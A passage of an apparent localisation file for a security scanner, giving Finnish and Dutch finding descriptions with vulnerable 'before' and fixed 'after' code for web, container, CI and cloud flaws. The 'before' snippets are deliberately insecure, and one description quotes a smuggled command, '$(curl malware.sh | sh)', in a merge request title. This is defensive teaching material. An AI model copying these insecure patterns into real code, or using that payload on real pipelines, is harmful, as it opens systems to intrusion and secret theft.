      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "no-login-rate-limit": {
    title: "Kirjautumislomake ei estä liian montaa peräkkäistä yritystä",
    description:
      "Kirjautumisreitti on määritelty tiedostossa, mutta samassa tiedostossa ei näy merkkiäkään rate limiting -middlewaresta. Ilman yritysten rajoitusta hyökkääjä voi kokeilla salasanoja peräkkäin (brute force) ilman että häntä hidastetaan.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "Salasanoja tai arkaluonteisia tietoja päätyy lokeihin",
    description:
      "console.log-kutsu (tai vastaava) sisältää muuttujan nimeltä password, token, secret tai apiKey. Jos nämä lokit päätyvät ulkoiseen palveluun tai tiedostoon, arkaluonteinen data pysyy selväkielisenä paljon pidempään kuin on tarpeen.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "xss-dangerous-html": {
    title: "Käyttäjien kirjoittama teksti voisi suorittaa koodia selaimessa",
    description:
      "Sisältö lisätään sivulle raakana HTML:nä (dangerouslySetInnerHTML, v-html, .innerHTML) tavallisen tekstin sijaan. Jos tämä sisältö sisältää käyttäjän syötettä, se voi sisältää skriptejä, jotka suoritetaan sivua lukevan käyttäjän selaimessa.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// tai, jos HTML:ää tarvitaan: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "Ladattujen tiedostojen tila on näkyvissä kaikille",
    description:
      "Tallennusbucket (Supabase Storage, S3) on määritetty julkiseksi. Jos se sisältää käyttäjien lataamia dokumentteja, kuvia tai tiedostoja, kuka tahansa polun tunteva — tai sen arvaava — pääsee niihin käsiksi ilman autentikointia.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// tarjoile tiedostot aikarajoitetuilla allekirjoitetuilla URL:eilla: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "Pelkkä linkki riittää poistamaan tai muuttamaan dataa",
    description:
      "GET-reitti suorittaa operaation, joka muuttaa dataa (polku sisältää delete/remove/update/edit). GET-pyynnöt suoritetaan jo pelkästä linkin vierailusta tai kuvan lataamisesta ulkoiselta sivustolta — klassinen ponnahduslauta CSRF-hyökkäykselle.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Selaimeen tallennettuja kirjautumistietoja ei ole hyvin suojattu",
    description:
      "Pääsytoken tallennetaan localStorageen. Toisin kuin httpOnly-eväste, mikä tahansa sivulla suoritettava skripti (mukaan lukien XSS:n kautta injektoitu haitallinen skripti) voi lukea ja varastaa sen.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// aseta token httpOnly-evästeenä palvelimelta:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "Sivustoa voidaan käyttää ohjaamaan huijaussivustolle",
    description:
      "Sivusto ohjaa käyttäjän osoitteeseen, joka on otettu suoraan pyynnöstä (query, body, params), tarkistamatta että se on tunnettu domain. Linkki, joka näyttää osoittavan sivustollesi, voi todellisuudessa viedä phishing-sivulle.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "Numeron vaihtaminen osoitteessa voisi näyttää jonkun muun tiedot",
    description:
      "Tietokantakysely käyttää suoraan URL:sta otettua tunnistetta (req.params.id) tarkistamatta lähellä olevilla riveillä, että se kuuluu pyynnön tekevälle käyttäjälle. Id:n vaihtaminen osoitteessa voisi antaa pääsyn toisen käyttäjän tietoihin — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "header-injection": {
    title: "Pyynnön arvo päätyy suoraan HTTP-vastauksen otsikkoon",
    description:
      "HTTP-vastauksen otsikko asetetaan suoraan pyynnöstä (query, body, params) otetulla arvolla tarkistamatta, ettei se sisällä rivinvaihtoa (CRLF). Hyökkääjä voi lisätä ylimääräisiä otsikoita tai jopa kokonaan erilaisen vastauksen — response splitting — mikä mahdollistaa välimuistin, evästeiden tai muille käyttäjille näytettävän sisällön manipuloinnin.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "docker-missing-user": {
    title: "Dockerfile ei aseta non-root-käyttäjää",
    description:
      "Dockerfilessä ei ole USER-käskyä: ilman sitä kontti ajetaan roottina. Jos hyökkääjä onnistuu suorittamaan koodia kontin sisällä (esim. hyödyntämällä haavoittuvaa kirjastoa), root kontin sisällä tekee mahdollisesta pakoyrityksestä hostille — tai laajemmasta vaikutuksesta ympäröivään järjestelmään — helpomman.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Kubernetes-manifesti ei eksplisiittisesti pakota ajamaan non-root-käyttäjänä",
    description:
      'Manifestissa ei ole "runAsNonRoot"-asetusta missään (ei podin eikä kontin tasolla): ilman sen asettamista kontti ajetaan sillä käyttäjällä, jonka sen image määrittelee — usein oletuksena root, jos image itse ei ole muuttanut tätä. Asettamalla se eksplisiittisesti true-arvoon podin käynnistys epäonnistuu, jos image silti yrittää ajaa roottina, sen sijaan että asia selviäisi vasta vahingon jälkeen.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "gha-unpinned-action": {
    title: "Kolmannen osapuolen CI-toimintoa ei ole lukittu tarkkaan versioon (commit SHA)",
    description:
      'Workflow käyttää kolmannen osapuolen actionia, johon viitataan tagilla tai branchilla (esim. "@v1", "@main") commit SHA:n sijaan. Sen ylläpitäjä — tai joku, joka vaarantaa hänen tilinsä — voi siirtää tämän viittauksen toiseen committiin milloin tahansa, muuttaen hiljaisesti mitä CI:ssä ajetaan, pääsyllä sen salaisuuksiin. Commit SHA osoittaa aina täsmälleen samaan koodiin.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, lukittu commit SHA:han — päivitä SHA kun päivität version`,
    },
  },
  "gha-excessive-permissions": {
    title: "Workflow myöntää itselleen kaikki tokenin oikeudet sen sijaan, että käyttäisi vain tarvitsemiaan",
    description:
      '"permissions: write-all" myöntää workflown GITHUB_TOKENille kirjoitusoikeuden kaikkeen — issueihin, pull requesteihin, paketteihin, deploymentteihin — vaikka workflow käyttäisi vain osaa niistä. Jos workflown jokin vaihe vaarantuu (haitallinen riippuvuus, injektoitu skripti), nämä laajemmat oikeudet kasvattavat sitä, mitä hyväksikäyttäjä voi tehdä.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # vain ne oikeudet, joita workflow oikeasti käyttää`,
    },
  },
  "insecure-cookie-flags": {
    title: "Istunto- tai autentikointieväste on asetettu ilman Secure- ja HttpOnly-lippuja",
    description:
      'Eväste, jonka nimi muistuttaa sessiota/autentikointia/tokenia, asetetaan ilman "httpOnly"- ja "secure"-asetuksia. Ilman httpOnlya sivulla oleva JavaScript — mukaan lukien XSS:n kautta injektoitu koodi — voi lukea kyseisen evästeen. Ilman securea se voidaan myös lähettää salaamattoman HTTP-yhteyden yli.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Haavoittuva riippuvuus:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Korjattua versiota ei vielä tiedossa — harkitse vaihtoehtoista pakettia tai seuraa projektin päivityksiä."
      ),
    },
  }),
  "docker-unpinned-base-image": {
    title: 'Dockerfilen peruskuva käyttää ":latest"-tagia',
    description:
      'FROM-käsky käyttää eksplisiittisesti ":latest"-tagia tarkan version sijaan. "latest" muuttuu ajan myötä: sama build, uusittuna eri hetkellä, voi saada eri version peruskuvasta — ei-toistettavissa oleva build, ja ei-toivottu päivitys voi tulla ilman että kukaan on päättänyt niin.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Dockerfile lataa etätiedoston ADD:lla COPY:n sijaan",
    description:
      "ADD-käsky http/https-URL:lla lataa tiedoston internetistä buildin aikana ilman eheystarkistusta ja ilman että sisältö näkyy repositoriossa. Jos tämä URL joskus vaarantuu, build sisällyttää mielivaltaista sisältöä ilman että kukaan huomaa sitä pelkästään Dockerfileä lukemalla.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<odotettu hash>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Block Public Access on pois käytöstä Terraformissa määritellyssä S3-bucketissa",
    description:
      'Yksi tai useampi "aws_s3_bucket_public_access_block"-resurssin neljästä suojauksesta (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) on asetettu false-arvoon. Tämä ei tarkoita, että bucket olisi jo julkinen, mutta se poistaa turvaverkon, joka estäisi sen muuttumisen julkiseksi vahingossa tulevaisuudessa.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Terraformissa määritelty IAM-policy myöntää täyden pääsyn",
    description:
      'Statement, jonka action on "*" ja resource "*", myöntää täyden pääsyn jokaiseen AWS-palveluun ja -resurssiin — sama tarkistus, joka on jo tehty live-IAM-tilalle, tässä luettuna suoraan koodista ennen kuin sitä on edes sovellettu. Tämä voi olla tarkoituksellista hätätilaroolille, mutta se pitää varmistaa: päivittäiseen käyttöön myönnä vain oikeasti tarvittavat oikeudet.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::sinun-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "Google Cloud Storage -bucket on tehty luettavaksi kenelle tahansa",
    description:
      'Resurssi "google_storage_bucket_iam_member" tai "google_storage_bucket_iam_binding" myöntää roolin "allUsers"- tai "allAuthenticatedUsers"-arvolle — ensimmäinen tekee bucketista luettavan kenelle tahansa internetissä, jopa ilman Google-tiliä; jälkimmäinen kenelle tahansa, jolla on mikä tahansa Google-tili, ei vain niille, joilla pitäisi olla pääsy.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:joku@example.com"  # vain ne, joilla pitää oikeasti olla pääsy, ei allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "Julkinen blob-pääsy on käytössä Azure-tallennustilissä",
    description:
      '"allow_blob_public_access" on asetettu true-arvoon "azurerm_storage_account"-resurssissa: kuka tahansa, joka tietää julkiseksi tehdyn blobin/containerin URL:n, voi lukea sen ilman mitään autentikointia.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "Google Cloud IAM -rooli myöntää täyden pääsyn (Owner/Editor)",
    description:
      '"google_project_iam_binding"/"google_project_iam_member" (tai vastaava organisaatio-/kansiotasolla) myöntää primitiivisen roolin "roles/owner" tai "roles/editor" — lähes täyden pääsyn jokaiseen projektin palveluun. Tämä voi olla tarkoituksellista hätätilitiliä varten, mutta se pitää varmistaa: päivittäiseen käyttöön myönnä vain tarkemmat, oikeasti tarvittavat valmiiksi määritellyt roolit.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # vain oikeasti tarvittava valmiiksi määritelty rooli, ei roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Azure-roolimääritys myöntää täyden pääsyn (Owner)",
    description:
      '"azurerm_role_assignment" myöntää "Owner"-roolin — täyden pääsyn, mukaan lukien hallinnan muiden käyttäjien oikeuksiin, koko määritetyn scopen yli (tilaus, resurssiryhmä...). Tämä voi olla tarkoituksellista hätätilitiliä varten, mutta se pitää varmistaa: päivittäiseen käyttöön myönnä vain tarkempi, oikeasti tarvittava rooli (esim. "Contributor" yhdelle resurssiryhmälle).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # vain tarkempi, oikeasti tarvittava rooli, ei Owner koko tilaukselle\n}`,
    },
  },
  "weak-random-token": {
    title: "Turvatoken on generoitu satunnaislukugeneraattorilla, joka ei ole kryptografisesti turvallinen",
    description:
      "Arvo, jonka nimi on tyyliin token/session/reset/otp/csrf, generoidaan Math.random()-funktiolla (JS), random.random()-funktiolla (Python) tai rand()-funktiolla (PHP) — generaattoreilla, joita ei ole suunniteltu turvallisuutta varten ja joiden sekvenssit ovat ennustettavissa. Näin generoitu token voidaan arvata tai rakentaa uudelleen, mikä tekee tyhjäksi sen olemassaolon tarkoituksen (esim. salasanan palautuslinkki, jonka kuka tahansa voisi ennustaa).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, ei Math.random — ennustamaton`,
    },
  },
  "ldap-injection": {
    title: "LDAP-suodatin rakennetaan yhdistämällä suoraan pyynnön arvo",
    description:
      'Rivi, joka rakentaa LDAP-suodattimen (esim. "(uid=...)"), sisältää suoraan pyynnöstä otetun arvon ilman LDAP:n erikoismerkkien escapeamista. Tämän arvon hallitsija voi muuttaa suodattimen logiikkaa — esimerkiksi ohittaa autentikointitarkistuksen tai lukea hakemistodataa, jota hänen ei pitäisi nähdä.',
    fix: {
      before: `const filter = \`(uid=\${req.body.username})\`;\nclient.search(base, { filter });`,
      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // LDAP:n erikoismerkit pitää aina escapeta ennen niiden käyttöä suodattimessa\nclient.search(base, { filter });`,
    },
  },
    "gitlab-ci-script-injection": {
      title: 'Ulkoisen käyttäjän hallitsema arvo kulkee toisen kuoren läpi GitLab CI -putkessa',
      description: '"script:"-rivi (tai "before_script:"/"after_script:") käyttää komentoa "eval" tai "sh -c"/"bash -c" yhdessä GitLabin ennalta määritellyn muuttujan kanssa, kuten merge requestin otsikko, commit-viesti tai haaran nimi — kaikki näistä voi kirjoittaa kuka tahansa, joka avaa merge requestin, jopa ulkoisesta forkista. Arvo laajennetaan ensin ulkoisessa kuoressa ja liitetään sitten merkkijonoon, jonka toinen kuori tulkitsee uudelleen koodina: otsikko kuten "$(curl malware.sh | sh)" suorittaisi mielivaltaisia komentoja putkessa, pääsyllä kaikkiin kyseisen jobin saatavilla oleviin secreteihin.',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # välitetty komennon argumenttina, ei koskaan "bash -c" -merkkijonon sisällä, joka tulkitsisi sen uudelleen`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'Docker-in-Docker GitLab CI -putkessa toimii TLS-salaus pois päältä',
      description: 'Job käyttää "docker:dind"-palvelua (Docker-in-Docker, tarvitaan image-rakentamiseen putken sisällä), mutta asettaa "DOCKER_TLS_CERTDIR"-arvoksi tyhjän merkkijonon, mikä poistaa TLS-salauksen kokonaan käytöstä Docker-clientin ja dind-daemonin väliltä. Ilman TLS:ää kuka tahansa, joka pääsee käsiksi tuohon porttiin samassa runnerin sisäverkossa, voi hallita Docker-daemonia — joka toimii laajennetuilla oikeuksilla — sen sijaan että rajoittuisi vain siihen jobiin, jonka pitäisi sitä käyttää.',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # TLS pysyy päällä Docker-clientin ja dind-daemonin välillä — "" poistaa sen kokonaan käytöstä`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'GitLab CI -putken Docker-image ei ole kiinnitetty tiettyyn versioon',
      description: 'Putken "image:" osoittaa imageen ilman tagia (vastaa ":latest"-tagia) tai suoraan ":latest"-tagiin. Kuka tahansa kyseistä imagea ylläpitää, voi vaihtaa sen sisällön milloin tahansa ilman että repositorio muuttuu — sama putki voi alkaa ajaa eri koodia päivästä toiseen, mikä on toimitusketjuriski, joka vastaa käsitteellisesti tagilla eikä commitilla viitattua GitHub Actionia.',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # tietty tagi (tai vielä parempi digest "node@sha256:...") "latest"-tagin sijaan`,
      },
    },
},
  nl: {
  "supabase-service-role-in-client": {
    title: "De geheime sleutel van Supabase komt terecht in een bestand dat naar de browser wijst",
    description:
      "Een variabele met een publiek voorvoegsel (bijv. NEXT_PUBLIC_, VITE_) of een client-side bestand verwijst naar de service role key van Supabase. Deze sleutel omzeilt Row Level Security: als die in de browserbundel terechtkomt, kan iedereen hem lezen en zich voordoen als databasebeheerder.",
    fix: {
      before: `// components/Dashboard.tsx
const supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (alleen server)
const supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "Wachtwoorden of geheime sleutels staan rechtstreeks in de code",
    description:
      "Een API-sleutel, token of wachtwoord lijkt als letterlijke waarde te zijn geschreven in plaats van uit een omgevingsvariabele te worden gelezen. Iedereen die de broncode leest (of de repository, als die openbaar is) krijgt dat geheim in handen.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "Een bestand met de echte wachtwoorden van het project zit tussen de geanalyseerde bestanden",
    description:
      "Een .env-bestand met echte waarden (geen .env.example) is opgenomen in de analyse. Als dit bestand in een repository of een openbare deploy terechtkomt, liggen alle inloggegevens die het bevat bloot.",
    fix: {
      before: `# .env (per ongeluk gecommit)
DATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (gecommit)
DATABASE_URL=postgres://user:password@localhost/dev

# .env blijft buiten de repo (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "Iedereen kan de gegevens van alle gebruikers lezen of wijzigen",
    description:
      "Row Level Security is uitgeschakeld, of een policy staat toegang toe aan iedereen (USING (true)) zonder te controleren wie de aanvraag doet. Elke geauthenticeerde gebruiker — of zelfs een anonieme — kan de gegevens van alle anderen lezen of wijzigen.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;
CREATE POLICY "owners only" ON public.orders
  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "Een door de gebruiker ingevoerde waarde wordt rechtstreeks in een databasequery geplakt",
    description:
      "Een SQL-query wordt opgebouwd door een string rechtstreeks te concateneren of te interpoleren in plaats van parameters te gebruiken. Als die tekst (ook indirect) van een gebruiker komt, kan die de query zelf veranderen — SQL-injectie.",
    fix: {
      before: `db.query(\`SELECT * FROM users WHERE email = '\${email}'\`)`,
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "Wachtwoorden lijken niet beschermd te zijn",
    description:
      "Een wachtwoordveld wordt precies zo opgeslagen als het in het verzoek binnenkwam, en er komt geen hashfunctie (bcrypt, argon2, scrypt) voor in het bestand. Als de database wordt gecompromitteerd, is elk wachtwoord direct bruikbaar.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)
await db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "Het geheim dat wordt gebruikt om logins te ondertekenen staat in platte tekst in de code",
    description:
      "Het geheim dat wordt doorgegeven aan jwt.sign / jwt.verify (of de variabele JWT_SECRET) is een letterlijke waarde in de code in plaats van afkomstig uit een omgevingsvariabele. Iedereen die het leest kan geldige toegangstokens voor elke gebruiker aanmaken.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "De server kan worden gedwongen externe commando's uit te voeren",
    description:
      "Een functie die systeemcommando's uitvoert (exec, execSync, spawn) ontvangt een string die is opgebouwd door interpolatie of concatenatie. Als een deel van die string uit gebruikersinvoer komt, kan wie dat controleert willekeurige commando's op de server uitvoeren.",
    fix: {
      before: `execSync(\`convert \${filename} output.png\`)`,
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "path-traversal": {
    title: "Een bestand op de server kan worden gelezen of geschreven door het pad van buitenaf te kiezen",
    description:
      'Een functie die een bestand leest, schrijft of verstuurt, haalt het pad rechtstreeks uit een waarde van het verzoek (query, body, params) zonder te controleren dat dit binnen een toegestane map blijft. Een aanvaller kan "../" invoegen om buiten de bedoelde map te komen en willekeurige bestanden op de server te lezen of overschrijven (bijv. een configuratiebestand met inloggegevens).',
    fix: {
      before: `app.get("/download", (req, res) => {
  res.sendFile(req.query.file)
})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")
app.get("/download", (req, res) => {
  const target = path.resolve(ALLOWED_DIR, req.query.file)
  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Pad niet toegestaan")
  res.sendFile(target)
})`,
    },
  },
  "nosql-injection": {
    title: "Een door de gebruiker ingevoerde waarde wordt als code uitgevoerd binnen een MongoDB-query",
    description:
      "De $where-operator van MongoDB voert voor elk document server-side JavaScript uit — als die string wordt opgebouwd door een waarde van de gebruiker te concateneren, kan wie dat controleert willekeurige code laten uitvoeren binnen de context van de database, niet alleen het filter wijzigen zoals bij een gewone SQL-injectie.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "Een door de gebruiker ingevoerde waarde wordt geïnterpreteerd als een template, niet als data",
    description:
      "Een functie die een template compileert/rendert ontvangt de HELE template uit een waarde van het verzoek, in plaats van een vaste template te gebruiken en alleen de data door te geven. Een aanvaller kan rechtstreeks in de syntax van de template-engine schrijven (bijv. {{7*7}} voor Jinja2) en code op de server uitvoeren — Server-Side Template Injection, wat vaak leidt tot het uitvoeren van willekeurige commando's, niet alleen een weergaveprobleem zoals XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "De XML-parser kan worden gedwongen bestanden te lezen of externe verzoeken te doen",
    description:
      "Een XML-parser (DocumentBuilderFactory) wordt aangemaakt zonder externe entiteiten (DOCTYPE) expliciet uit te schakelen in de nabije regels. Als de parser XML ontvangt uit een niet-vertrouwde bron, kan een aanvaller een externe entiteit definiëren om bestanden op de server te lezen of hem een adres naar keuze te laten benaderen — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
DocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "docker-hardcoded-secret": {
    title: "Een geheim staat rechtstreeks in een ENV- of ARG-instructie in de Dockerfile",
    description:
      "Een variabele met een naam als password/secret/token/key heeft een letterlijke waarde in een ENV- of ARG-instructie. In tegenstelling tot een .env-bestand (dat normaal niet in de image terechtkomt), wordt deze waarde ingebakken in de Docker-image zelf — iedereen die deze kan pullen of de laaggeschiedenis kan inspecteren, kan hem terugvinden, zelfs als de regel in een latere versie van de Dockerfile wordt verwijderd.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD
ENV DB_PASSWORD=$DB_PASSWORD
# meegegeven met: docker build --build-arg DB_PASSWORD=*** (of, nog beter,
# een BuildKit secret mount, die nooit in de laaggeschiedenis terechtkomt)`,
    },
  },
  "k8s-privileged-container": {
    title: "Een container in het Kubernetes-manifest draait als privileged",
    description:
      '"privileged: true" in de securityContext van een container schakelt bijna alle gebruikelijke isolatie tussen container en host uit: de container krijgt toegang tot de apparaten van de host, kan de netwerkconfiguratie wijzigen, en kan in veel gevallen effectief rootgang tot de machine verkrijgen waarop hij draait. Vrijwel nooit nodig voor een normale app.',
    fix: {
      before: `securityContext:
  privileged: true`,
      after: `securityContext:
  privileged: false
  capabilities:
    add: ["NET_BIND_SERVICE"]  # alleen de capabilities die echt nodig zijn`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Een geheim staat in platte tekst in een env-variabele van een Kubernetes-manifest",
    description:
      "Een omgevingsvariabele met een naam als password/secret/token/key heeft een letterlijke waarde (\"value:\") in plaats van te worden gelezen uit een Secret (\"valueFrom.secretKeyRef\"). Het manifest zelf — vaak gecommit naar een repository — bevat daardoor het geheim in platte tekst, zichtbaar zelfs voor iemand die alleen de configuratie kan lezen, niet per se commando's in de cluster kan uitvoeren.",
    fix: {
      before: `env:
  - name: DB_PASSWORD
    value: supersecret123`,
      after: `env:
  - name: DB_PASSWORD
    valueFrom:
      secretKeyRef:
        name: db-credentials
        key: password`,
    },
  },
  "terraform-open-security-group": {
    title: "Een Terraform-security group opent een gevoelige poort voor het hele internet",
    description:
      'Een regel met "cidr_blocks" die 0.0.0.0/0 bevat (elk IP-adres) staat dicht bij een gevoelige poort — SSH (22), RDP (3389), of een typische databasepoort (MySQL, Postgres, MongoDB, Redis, SQL Server). Iedereen op internet kan proberen verbinding te maken met die dienst, niet alleen wie dat zou moeten.',
    fix: {
      before: `ingress {
  from_port   = 22
  to_port     = 22
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"]
}`,
      after: `ingress {
  from_port   = 22
  to_port     = 22
  protocol    = "tcp"
  cidr_blocks = ["10.0.0.0/16"]  # alleen je eigen privénetwerk, of een bastion host
}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Een Google Cloud-firewallregel opent een gevoelige poort voor het hele internet",
    description:
      'Een "google_compute_firewall"-resource met "source_ranges" die 0.0.0.0/0 bevat (elk IP-adres) staat verkeer toe naar een gevoelige poort — SSH (22), RDP (3389), of een typische databasepoort (MySQL, Postgres, MongoDB, Redis, SQL Server). Iedereen op internet kan proberen verbinding te maken met die dienst, niet alleen wie dat zou moeten.',
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {
  allow {
    protocol = "tcp"
    ports    = ["22"]
  }
  source_ranges = ["0.0.0.0/0"]
}`,
      after: `resource "google_compute_firewall" "allow-ssh" {
  allow {
    protocol = "tcp"
    ports    = ["22"]
  }
  source_ranges = ["10.0.0.0/16"]  # alleen je eigen privénetwerk, of een bastion host
}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Een Azure-netwerkregel opent een gevoelige poort voor het hele internet",
    description:
      'Een netwerkbeveiligingsregel ("azurerm_network_security_rule", of een "security_rule"-blok binnen "azurerm_network_security_group") met "source_address_prefix" ingesteld op "*" of "0.0.0.0/0", richting "Inbound" en toegang "Allow", dicht bij een gevoelige poort — SSH (22), RDP (3389), of een typische databasepoort. Iedereen op internet kan proberen verbinding te maken met die dienst, niet alleen wie dat zou moeten.',
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {
  direction              = "Inbound"
  access                 = "Allow"
  destination_port_range = "22"
  source_address_prefix  = "*"
}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {
  direction              = "Inbound"
